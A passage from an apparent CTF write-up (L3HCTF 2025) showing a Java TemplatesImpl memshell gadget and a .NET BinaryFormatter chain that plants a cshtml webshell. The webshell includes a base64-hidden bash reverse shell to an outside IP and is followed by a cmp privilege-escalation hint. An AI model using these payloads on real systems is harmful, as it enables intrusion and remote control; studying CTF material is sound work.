com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> common.ClassFiles;</span><br><span class="line"><span class="keyword">import</span> common.Reflections;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.LoaderClassPath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplNode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class tplClass;</span><br><span class="line">        Class abstTranslet;</span><br><span class="line">        Class transFactory;</span><br><span class="line">        <span class="keyword">if</span> (Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>))) &#123;</span><br><span class="line">            tplClass = Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">            abstTranslet = Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            transFactory = Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tplClass = TemplatesImpl.class;</span><br><span class="line">            abstTranslet = AbstractTranslet.class;</span><br><span class="line">            transFactory = TransformerFactoryImpl.class;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;memo.FilterMemshell&quot;</span>, <span class="literal">false</span>, Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(clazz, (String) <span class="literal">null</span>, (<span class="type">byte</span>[]) <span class="literal">null</span>, tplClass, abstTranslet, transFactory);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span><span class="params">(Class myClass, String command, <span class="type">byte</span>[] bytes, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> (T) tplClass.newInstance();</span><br><span class="line">        <span class="type">byte</span>[] classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (myClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(myClass.getName());</span><br><span class="line">            ctClass.setSuperclass(superC);</span><br><span class="line">            ctClass.setName(myClass.getName() + System.nanoTime());</span><br><span class="line">            classBytes = ctClass.toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes, ClassFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Foo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到最后仍旧有个小坑点，这台机器远程没有&#x2F;bin&#x2F;bash，捣鼓半天换成&#x2F;bin&#x2F;sh就拿到flag了</p>
<p><img src="../images/2025-L3HCTF/628e4417-4507-45a2-ba52-5ecf38f1a415.png" alt="img"></p>
<p>Get flag</p>
<p><img src="../images/2025-L3HCTF/db43b021-3df5-48ca-ab97-3edb5efa1554.png" alt="img"></p>
<h2><span id="lookingmyeyes">LookingMyEyes</span><a href="#lookingmyeyes" class="header-anchor"></a></h2><p>考察.NET反序列化，看一下链子的构成</p>
<p>出题人写了一条非常简单的链子。</p>
<p><img src="../images/2025-L3HCTF/b12e1317-4812-4bdc-a518-fe2dbb461620.png" alt="img"></p>
<p>这里直接利用委托方法调用写文件的函数。覆盖&#x2F;app&#x2F;Looking&#x2F;My&#x2F;Eyes.cshtml</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">using ClassLibrary1;</span><br><span class="line">using ClassLibrary1.Beans;</span><br><span class="line">using ClassLibrary1.Transform;</span><br><span class="line">using ClassLibrary1.Utils;</span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdvancedTestPayloadGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Main</span><span class="params">(string[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">string</span> <span class="variable">base64</span> <span class="operator">=</span> Generate();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;=== Generated BinaryFormatter Payload (Base64) ===&quot;</span>);</span><br><span class="line">        Console.WriteLine(base64);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;=== End ===&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> object <span class="title function_">Deserialize</span><span class="params">(string s)</span></span><br><span class="line">    &#123;</span><br><span class="line">        AppContext.SetSwitch(<span class="string">&quot;Switch.System.Runtime.Serialization.SerializationGuard.AllowFileWrites&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        object obj;</span><br><span class="line">        using (<span class="type">MemoryStream</span> <span class="variable">memoryStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MemoryStream</span>(Convert.FromBase64String(s)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">object</span> <span class="variable">deserialize</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BinaryFormatter</span></span><br><span class="line">            &#123;</span><br><span class="line">                Binder = <span class="keyword">new</span> <span class="title class_">MySecBinder</span>()</span><br><span class="line">            &#125;.Deserialize(memoryStream);</span><br><span class="line">            obj = deserialize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> string <span class="title function_">Generate</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">string</span> <span class="variable">base64String</span> <span class="operator">=</span> <span class="string">&quot;QHsKICAgIExheW91dCA9IG51bGw7CiAgICBzdHJpbmcgb3V0cHV0ID0gIiI7CiAgICB0cnkKICAgIHsKICAgICAgICB2YXIgcHJvY2Vzc0Fzc2VtYmx5ID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZCgiU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MiKTsKICAgICAgICB2YXIgcHNpVHlwZSA9IHByb2Nlc3NBc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbyIpOwogICAgICAgIHZhciBwcm9jZXNzVHlwZSA9IHByb2Nlc3NBc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyIpOwogICAgICAgIHZhciBwc2kgPSBTeXN0ZW0uQWN0aXZhdG9yLkNyZWF0ZUluc3RhbmNlKHBzaVR5cGUpOwogICAgICAgIHBzaVR5cGUuR2V0UHJvcGVydHkoIkZpbGVOYW1lIikuU2V0VmFsdWUocHNpLCAiYmFzaCIpOwogICAgICAgIHBzaVR5cGUuR2V0UHJvcGVydHkoIkFyZ3VtZW50cyIpLlNldFZhbHVlKHBzaSwgIi1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNTEuMTM3Lzk5OTkgMD4mMVwiIik7CiAgICAgICAgcHNpVHlwZS5HZXRQcm9wZXJ0eSgiUmVkaXJlY3RTdGFuZGFyZE91dHB1dCIpLlNldFZhbHVlKHBzaSwgdHJ1ZSk7CiAgICAgICAgcHNpVHlwZS5HZXRQcm9wZXJ0eSgiUmVkaXJlY3RTdGFuZGFyZEVycm9yIikuU2V0VmFsdWUocHNpLCB0cnVlKTsKICAgICAgICBwc2lUeXBlLkdldFByb3BlcnR5KCJVc2VTaGVsbEV4ZWN1dGUiKS5TZXRWYWx1ZShwc2ksIGZhbHNlKTsKICAgICAgICBwc2lUeXBlLkdldFByb3BlcnR5KCJDcmVhdGVOb1dpbmRvdyIpLlNldFZhbHVlKHBzaSwgdHJ1ZSk7CiAgICAgICAgdmFyIHN0YXJ0TWV0aG9kID0gcHJvY2Vzc1R5cGUuR2V0TWV0aG9kKCJTdGFydCIsIG5ld1tdIHsgcHNpVHlwZSB9KTsKICAgICAgICB2YXIgcHJvY2VzcyA9IHN0YXJ0TWV0aG9kLkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBwc2kgfSk7CiAgICAgICAgdmFyIHN0ZE91dFByb3BlcnR5ID0gcHJvY2Vzc1R5cGUuR2V0UHJvcGVydHkoIlN0YW5kYXJkT3V0cHV0Iik7CiAgICAgICAgdmFyIHN0ZE91dFJlYWRlciA9IChTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKXN0ZE91dFByb3BlcnR5LkdldFZhbHVlKHByb2Nlc3MpOwogICAgICAgCiAgICAgICAgb3V0cHV0ID0gc3RkT3V0UmVhZGVyLlJlYWRUb0VuZCgpOwoKICAgICAgICB2YXIgc3RkRXJyUHJvcGVydHkgPSBwcm9jZXNzVHlwZS5HZXRQcm9wZXJ0eSgiU3RhbmRhcmRFcnJvciIpOwogICAgICAgIHZhciBzdGRFcnJSZWFkZXIgPSAoU3lzdGVtLklPLlN0cmVhbVJlYWRlcilzdGRFcnJQcm9wZXJ0eS5HZXRWYWx1ZShwcm9jZXNzKTsKICAgICAgICBzdHJpbmcgZXJyb3JPdXRwdXQgPSBzdGRFcnJSZWFkZXIuUmVhZFRvRW5kKCk7CgogICAgICAgIHZhciB3YWl0Rm9yRXhpdE1ldGhvZCA9IHByb2Nlc3NUeXBlLkdldE1ldGhvZCgiV2FpdEZvckV4aXQiLCBTeXN0ZW0uVHlwZS5FbXB0eVR5cGVzKTsKICAgICAgICB3YWl0Rm9yRXhpdE1ldGhvZC5JbnZva2UocHJvY2VzcywgbnVsbCk7CgogICAgICAgIGlmICghc3RyaW5nLklzTnVsbE9yV2hpdGVTcGFjZShlcnJvck91dHB1dCkpCiAgICAgICAgewogICAgICAgICAgICBvdXRwdXQgKz0gIlxuW3N0ZGVycl1cbiIgKyBlcnJvck91dHB1dDsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgewogICAgICAgIG91dHB1dCA9ICLpgJrov4flj43lsITmiafooYzlkb3ku6Tml7blh7rplJk6XG4iICsgZXguVG9TdHJpbmcoKTsKICAgIH0KfQo8cHJlPkBvdXRwdXQ8L3ByZT4=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Convert.FromBase64String(base64String);</span><br><span class="line">        <span class="type">string</span> <span class="variable">payload</span> <span class="operator">=</span> System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line">        <span class="type">var</span> <span class="variable">invokerTransformer0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeTransformer</span></span><br><span class="line">        &#123;</span><br><span class="line">            methodName = <span class="string">&quot;SetMyClass&quot;</span>,</span><br><span class="line">            methodParam = <span class="keyword">new</span> <span class="title class_">object</span>[] &#123; <span class="string">&quot;System.IO.File, System.IO.FileSystem&quot;</span> &#125;,</span><br><span class="line">            typeName = <span class="string">&quot;ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">var</span> <span class="variable">invokerTransformer1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeTransformer</span></span><br><span class="line">        &#123;</span><br><span class="line">            methodName = <span class="string">&quot;SetMyMethod&quot;</span>,</span><br><span class="line">            methodParam = <span class="keyword">new</span> <span class="title class_">object</span>[] &#123; <span class="string">&quot;WriteAllText&quot;</span> &#125;,</span><br><span class="line">            typeName = <span class="string">&quot;ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">var</span> <span class="variable">invokeTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeTransformer</span></span><br><span class="line">        &#123;</span><br><span class="line">            methodName = <span class="string">&quot;MyCompare&quot;</span>,</span><br><span class="line">            methodParam = <span class="keyword">new</span> <span class="title class_">object</span>[] &#123; <span class="string">&quot;/app/Looking/My/Eyes.cshtml&quot;</span>,payload, <span class="string">&quot;w1ndc0me&quot;</span> &#125;,</span><br><span class="line">            typeName = <span class="string">&quot;ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>();</span><br><span class="line">        SetPrivateField(chainedTransformer, <span class="string">&quot;_transformers&quot;</span>, <span class="keyword">new</span> <span class="title class_">InvokeTransformer</span>[] &#123; invokerTransformer0, invokerTransformer1, invokeTransformer &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">indirectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndirectBean</span>();</span><br><span class="line">        SetPrivateField(indirectBean, <span class="string">&quot;_transform&quot;</span>, chainedTransformer);</span><br><span class="line">        SetPrivateField(indirectBean, <span class="string">&quot;bean&quot;</span>, <span class="keyword">new</span> <span class="title class_">CompareImpl</span>&lt;string&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">entryPointBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DirectBean</span>();</span><br><span class="line">        SetPrivateField(entryPointBean, <span class="string">&quot;s&quot;</span>, indirectBean);</span><br><span class="line">        <span class="type">var</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BinaryFormatter</span>();</span><br><span class="line">        using (<span class="type">var</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MemoryStream</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            formatter.Serialize(stream, entryPointBean);</span><br><span class="line">            <span class="keyword">return</span> Convert.ToBase64String(stream.ToArray());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetPrivateField</span><span class="params">(object obj, string fieldName, object value)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> obj.GetType();</span><br><span class="line">        <span class="type">BindingFlags</span> <span class="variable">flags</span> <span class="operator">=</span> BindingFlags.NonPublic | BindingFlags.Instance;</span><br><span class="line">        <span class="type">FieldInfo</span> <span class="variable">field</span> <span class="operator">=</span> type.GetField(fieldName, flags);</span><br><span class="line">        field.SetValue(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意这里利用的是cshtml，由于系统是编译之后的，所以需要反射调用恶意dll</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@&#123;</span><br><span class="line">    Layout = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">string</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">processAssembly</span> <span class="operator">=</span> System.Reflection.Assembly.Load(<span class="string">&quot;System.Diagnostics.Process&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">psiType</span> <span class="operator">=</span> processAssembly.GetType(<span class="string">&quot;System.Diagnostics.ProcessStartInfo&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">processType</span> <span class="operator">=</span> processAssembly.GetType(<span class="string">&quot;System.Diagnostics.Process&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">psi</span> <span class="operator">=</span> System.Activator.CreateInstance(psiType);</span><br><span class="line">        psiType.GetProperty(<span class="string">&quot;FileName&quot;</span>).SetValue(psi, <span class="string">&quot;bash&quot;</span>);</span><br><span class="line">        psiType.GetProperty(<span class="string">&quot;Arguments&quot;</span>).SetValue(psi, <span class="string">&quot;-c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">        psiType.GetProperty(<span class="string">&quot;RedirectStandardOutput&quot;</span>).SetValue(psi, <span class="literal">true</span>);</span><br><span class="line">        psiType.GetProperty(<span class="string">&quot;RedirectStandardError&quot;</span>).SetValue(psi, <span class="literal">true</span>);</span><br><span class="line">        psiType.GetProperty(<span class="string">&quot;UseShellExecute&quot;</span>).SetValue(psi, <span class="literal">false</span>);</span><br><span class="line">        psiType.GetProperty(<span class="string">&quot;CreateNoWindow&quot;</span>).SetValue(psi, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">startMethod</span> <span class="operator">=</span> processType.GetMethod(<span class="string">&quot;Start&quot;</span>, <span class="keyword">new</span>[] &#123; psiType &#125;);</span><br><span class="line">        <span class="type">var</span> <span class="variable">process</span> <span class="operator">=</span> startMethod.Invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">object</span>[] &#123; psi &#125;);</span><br><span class="line">        <span class="type">var</span> <span class="variable">stdOutProperty</span> <span class="operator">=</span> processType.GetProperty(<span class="string">&quot;StandardOutput&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">stdOutReader</span> <span class="operator">=</span> (System.IO.StreamReader)stdOutProperty.GetValue(process);</span><br><span class="line">        output = stdOutReader.ReadToEnd();</span><br><span class="line">        <span class="type">var</span> <span class="variable">stdErrProperty</span> <span class="operator">=</span> processType.GetProperty(<span class="string">&quot;StandardError&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">stdErrReader</span> <span class="operator">=</span> (System.IO.StreamReader)stdErrProperty.GetValue(process);</span><br><span class="line">        <span class="type">string</span> <span class="variable">errorOutput</span> <span class="operator">=</span> stdErrReader.ReadToEnd();</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">waitForExitMethod</span> <span class="operator">=</span> processType.GetMethod(<span class="string">&quot;WaitForExit&quot;</span>, System.Type.EmptyTypes);</span><br><span class="line">        waitForExitMethod.Invoke(process, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!string.IsNullOrWhiteSpace(errorOutput))</span><br><span class="line">        &#123;</span><br><span class="line">            output += <span class="string">&quot;\n[stderr]\n&quot;</span> + errorOutput;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        output = <span class="string">&quot;通过反射执行命令时出错:\n&quot;</span> + ex.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;pre&gt;<span class="meta">@output</span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>出题人还设置了一个坑点，在反序列化的时候过滤了，使用了return null这样是没用的。</p>
<p><img src="../images/2025-L3HCTF/9171acd8-b3f4-489e-b563-975875b31e8c.png" alt="img"></p>
<p>rce之后，需要用cmp进行提权。</p>
<p><a href="https://gtfobins.github.io/gtfobins/cmp/">https://gtfobins.github.io/gtfobins/cmp/</a></p>
<h1><span id="reverse">Reverse</span><a href="#reverse" class="header-anchor"></a></h1><h2><span id="temporalparadox">TemporalParadox</span><a href="#temporalparadox" class="header-anchor"></a></h2><p>main开头有花指令，nop掉跳转jmp即可反编译。动态调试跑一轮就知道各个函数的功能</p>
